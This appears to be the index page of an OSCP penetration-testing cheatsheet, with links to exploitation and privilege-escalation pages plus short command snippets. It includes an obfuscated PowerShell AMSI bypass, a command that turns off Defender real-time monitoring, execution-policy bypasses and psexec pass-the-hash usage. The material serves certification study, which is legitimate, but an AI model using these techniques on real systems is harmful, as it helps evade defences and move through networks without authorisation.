# OSCP_cheatsheet summary
* [General](#General)
   * [Buffer overflow](bufferoverflow.md)
   * [Metasploit](metasploit.md)
* [Enumeration](enumeration.md)
* [Exploitation](exploitation.md)
* [Privilege Escalation Windows](privesc_windows.md)
* [Privilege Escalation Linux](privesc_linux.md)
* [Post Exploitation](post_exploitation.md)

# General
## Other great cheatsheets
- https://github.com/CountablyInfinite/oscp_cheatsheet
- https://github.com/frizb/MSF-Venom-Cheatsheet/blob/master/README.md

#### Static binaries
- https://github.com/andrew-d/static-binaries
- https://github.com/ernw/static-toolbox/releases

#### Python error
When receiving the error “/usr/bin/env: ‘python\r’: No such file or directory when running an python exploit.
1.	Open the python file in vim
2.	Use the command ```:set ff=unix```
3.	Save the file. ```:wq```

#### SSH key files
ssh key files needs to be permission 600
```
sudo chmod 600 <FILE>
```

#### SSH allow diffie helman
```
ssh <USER>@<TARGET> -oKexAlgorithms=+diffie-hellman-group1-sha1
```

#### RDP commands
```
xfreerdp /d:<DOMAIN> /u:<USERNAME> /v:<TARGET IP> +clipboard
rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD>
```

#### Autorecon
https://github.com/DriftSec/AutoRecon-OSCP
```
sudo /home/user/.local/bin/autorecon -o autorecon <HOST> <HOST>
```

## CMD
#### Find string
```
| findstr /I “<FIND STRING>”
```

#### Ignore string
```
| findstr /v “<IGNORE STRING>” 
```

## Powershell
#### Powershell flags
- ```-nop```: (```-noprofile```) which instructs powershell not to load the powershell user profile.
-	```-w hidden```: to avoid creating a window on the user’s desktop
-	```-e```: (```-EncodedCommand```) use base64 encoding

#### Start as admin
```
powershell.exe Start-Process cmd.exe -Verb runAs
```

#### AMSI Bypass
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

#### Disbale AV (Requires local admin)
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Powershell execution policy
#### Get execution policy
```
Get-ExecutionPolicy -Scope CurrentUser
```

#### Bypass execution policy flag
```
-ExecutionPolicy Bypass
```

#### Disable execution policy
```
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

#### Impacket PSexec impacket
If no LM Hash use an empty one: ```aad3b435b51404eeaad3b435b51404ee```
```
python3 psexec.py -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME>@<TARGET>
python3 psexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>
```

## Compiling
#### Compile on linux
```
gcc
```

#### Cross compile exploit code
```
sudo apt install mingw-64
```

#### Compile 32bit Windows
```
i686-w64-mingw32-gcc something.c -o something.exe
```

#### Compile 64bit Windows
```
x86_64-w64-mingw32-gcc something.c -o something.exe
```

#### Compile 32 bit Linux
```
gcc -Wall -o exploit X.c -Wl,--hash-style=both -m32
```
